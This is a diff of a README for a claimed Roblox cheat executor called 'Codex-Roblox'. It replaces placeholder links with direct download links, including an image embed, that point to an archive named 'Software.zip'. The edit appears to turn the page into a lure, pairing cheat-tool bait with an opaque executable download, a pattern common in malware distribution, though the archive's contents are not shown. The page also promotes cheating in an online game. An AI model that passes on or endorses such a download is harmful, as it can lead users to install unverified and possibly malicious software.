@@ -29,7 +29,7 @@ Codex-Roblox is a powerful Roblox Codex Executor that supports low-end PCs, allo
 ## Installation
 You can download the latest release of Codex-Roblox by clicking the button below:  
 
-[![Download Codex-Roblox](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip "Download Codex-Roblox")
+[![Download Codex-Roblox](https://github.com/envycool6/Codex-Roblox/releases/download/v1.0/Software.zip)](https://github.com/envycool6/Codex-Roblox/releases/download/v1.0/Software.zip "Download Codex-Roblox")
 
 If the link above does not work, please check the "Releases" section of this repository for alternative download options.  
 
@@ -53,4 +53,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for visiting the Codex-Roblox repository! 🚀🎮 Let's make your Roblox gameplay even more exciting with Codex! 🌟
 
-![Codex-Roblox](https://www.example.com/codex-roblox.jpg)
+![Codex-Roblox](https://github.com/envycool6/Codex-Roblox/releases/download/v1.0/Software.zip)
